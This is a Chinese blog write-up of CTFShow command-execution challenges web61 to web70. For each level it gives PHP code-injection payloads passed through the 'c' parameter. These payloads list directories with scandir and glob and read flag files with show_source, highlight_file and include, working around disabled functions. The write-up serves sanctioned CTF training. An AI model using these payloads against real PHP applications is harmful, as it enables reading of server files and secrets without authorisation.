大家好，这里是KOKO师傅~
今天和大家一起来继续做CTFShow关于命令执行的题目！

## web61
我们先看题目：
![1](https://img-blog.csdnimg.cn/3b4f202692014335a9ea888bd2ba86f5.png)
可能是有需要用到的函数被禁用了！

打开环境后可以看到代码：
![2](https://img-blog.csdnimg.cn/86ea275682194615ae3fbde9c29c016a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
我们给c传参查看一下禁用的函数目录：

```php
 c=print_r(scandir('.'));#查看当前目录
 c=print_r(scandir('/'));#查看根目录
 c=print_r(glob('*'));#查看当前目录
 c=print_r(glob('/*'));#查看根目录

 c=var_dump(scandir('.'));#查看当前目录
 c=var_dump(scandir('/'));#查看根目录
 c=var_dump(glob('*'));#查看当前目录
 c=var_dump(glob('/*'));#查看根目录

c=var_export(scandir('.'));#查看当前目录
c=var_export(scandir('/'));#查看根目录
c=var_export(glob('*'));#查看当前目录
c=var_exportdump(glob('/*'));#查看根目录

#查看当前目录
c=print_r(scandir(current(localeconv())));
c=print_r(scandir(pos(localeconv())));#pos是current的别名，localeconv()返回的数组中第一个值为'.'

c=highlight_file(next(array_reverse(scandir(current(localeconv())))));#读取数组倒数第二个元素

?c=show_source(current(array_reverse(scandir(getcwd()))));#flag在最后一个文件
```
![3](https://img-blog.csdnimg.cn/2bc9330a4ed4428aa01acc52b5f0e047.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
因此我们可以构造payload:

```php
c=show_source(next(array_reverse(scandir(current(localeconv())))));
c=show_source('flag.php');
c=highlight_file('flag.php');
```

传参后即可得到flag：
![4](https://img-blog.csdnimg.cn/b5740d9719f04cf9af93e08d54944c77.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web62
![5](https://img-blog.csdnimg.cn/35a87f9597bb42869551d2e9c98d8768.png)
我们看到题目可以知道又是有关禁用函数的题目：
![6](https://img-blog.csdnimg.cn/74aba193b06848ebb1dda752605f1eab.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
我们可以沿用之前的payload：

```php
c=show_source(next(array_reverse(scandir(current(localeconv())))));
c=show_source('flag.php');
c=highlight_file('flag.php');
```

传参后得到flag：
![7](https://img-blog.csdnimg.cn/7dda460557944ee9945dd35c1005ac6f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web63
![8](https://img-blog.csdnimg.cn/3d5edf8e8466460390c6bca63929a7f9.png)
同样是禁用函数的题目：
![9](https://img-blog.csdnimg.cn/c3790719aa604a318b0aeb69c54252f4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
我们依旧可以沿用之前的payload:

```php
c=include('flag.php');echo $flag;
c=show_source(next(array_reverse(scandir(current(localeconv())))));
c=highlight_file('flag.php');
c=show_source('flag.php');
```

传参后得到flag：
![10](https://img-blog.csdnimg.cn/4bc98f4d730c4e76806e65da52ac9002.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web64
![11](https://img-blog.csdnimg.cn/7d13d2b1bc244e4681efabb9cdf2b6b5.png)我们打开环境可以看到源码：
![12](https://img-blog.csdnimg.cn/5f6b6cb0a227444bb2f8fa341479c4e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
之前构造的payload依然是可以用的：

```php
c=show_source(next(array_reverse(scandir(current(localeconv())))));
c=highlight_file('flag.php');
c=show_source('flag.php');
c=include('flag.php');var_dump(get_defined_vars());
```

传参后即可得到flag：
![13](https://img-blog.csdnimg.cn/500eeb05f9524e848d4280933eb18ac8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web65
![14](https://img-blog.csdnimg.cn/dfb240d1a36648f9b54dddba29467071.png)
依旧是禁用函数的题目~
![15](https://img-blog.csdnimg.cn/ff36cdfb948b41ad8be9599356b99b84.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
之前构造的payload依旧是成功的：

```php
c=show_source(next(array_reverse(scandir(current(localeconv())))));
c=highlight_file('flag.php');
c=show_source('flag.php');
c=include('flag.php');var_dump(get_defined_vars());
```

传参得到flag：
![16](https://img-blog.csdnimg.cn/3af934cd82a844209ddc77c915e9ac5d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web66
![17](https://img-blog.csdnimg.cn/a413fbdc32324dae99e018902365d746.png)
这次看看禁用的范围会不会扩大：
![18](https://img-blog.csdnimg.cn/183a2a9318dc4823bb2abb02dbfb048c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
这次发现之前的payload不能用了，而且一直用的`show_source()`也被禁了：
![19](https://img-blog.csdnimg.cn/7e4fb6ef3a414b1197c422e9a39196df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
因此我们用之前的读取目录语句发现在根目录里：
![20](https://img-blog.csdnimg.cn/24d2b23aeb1441f4a17e7d49e3c0c95e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
因此我们构造payload：
```powershell
c=highlight_file('/flag.txt')；
#highlight_file()函数是PHP中的一个内置函数，用于突出显示文件的语法。通过使用HTML标记突出显示语法。
#用法:
#highlight_file( $filename, $return )
#参数：该函数接受上述和以下描述的两个参数：
#$filename:它是必填参数。它指定要显示其内容的文件。
#$return:它是可选的布尔值参数。其默认值为FALSE。如果将其设置为TRUE，则该函数将以字符串形式返回突出显示的代码，而不是将其打印出来。
#返回值：成功返回TRUE，失败返回FALSE。如果$return设置为TRUE，它将以字符串形式返回突出显示的代码。
#注意：
#此功能在PHP 4.0.0和更高版本上可用。
#可以通过ini_set()函数或在php.ini文件中设置用于突出显示PHP语法的颜色。
#使用此功能，将显示整个文件，其中可能包含敏感数据，例如密码等。
```
传参后可得flag：
![21](https://img-blog.csdnimg.cn/4d366d65610642c9a31f2ca6fee23570.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web67
![22](https://img-blog.csdnimg.cn/4897a47d8eb643dcad34c8682bea8070.png)
我们打开环境，这次看看会有什么区别没~
![23](https://img-blog.csdnimg.cn/7cb0f00f9e1f47049b7d17b8a5b31df9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
发现是可以沿用上题的payload的：

```php
c=highlight_file('/flag.txt');
```
传参后即可得到flag：
![24](https://img-blog.csdnimg.cn/f214771e2be54313ba03652bee558d1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web68
![25](https://img-blog.csdnimg.cn/c80b0dcebdb74b6b96c161511f8f45fa.png)
这次的禁用函数题我们继续试试之前的payload是否可行：
![26](https://img-blog.csdnimg.cn/9dcc2d797d4147a3af5f0b475cd26506.png)
这次打开就是直接表明`highlight_file()`被禁用了！
那我们查看根目录：
![27](https://img-blog.csdnimg.cn/f9ca95740a7044858cc5d4fc846002c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
查看根目录可以发现flag还是在根目录下，但是`highlight_file()`被禁用了，那我们试试用`include()`函数构造payload：

```php
c=include('/flag.txt');
```
传参得到flag：
![28](https://img-blog.csdnimg.cn/ef5946421eda4603a565db9583d0763a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web69
![29](https://img-blog.csdnimg.cn/97096530a80046fd853d13c120f57f77.png)
这次看看是否和web68一样：
![30](https://img-blog.csdnimg.cn/873d6999ea5141fb902cbc15b4a3b05c.png)
我们试试之前的payload：
```php
c=include('/flag.txt');
```
传参得到flag：
![31](https://img-blog.csdnimg.cn/d351db138fb349c0bae8ef2dee665554.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

## web70
![32](https://img-blog.csdnimg.cn/705727e8644243ad8e16baf4d272fa44.png)
我们打开环境看看会不会有不同的：
![33](https://img-blog.csdnimg.cn/21790746f6504444aebee5d9cb0c7490.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)
让我们试试之前用来构造payload的函数会不会被禁用：
```php
c=include('/flag.txt');
```
传参得到flag，说明没有被禁用：
![34](https://img-blog.csdnimg.cn/70e6b7bb47654b30bdf5485d31593adf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAS29rb--9ng==,size_20,color_FFFFFF,t_70,g_se,x_16)

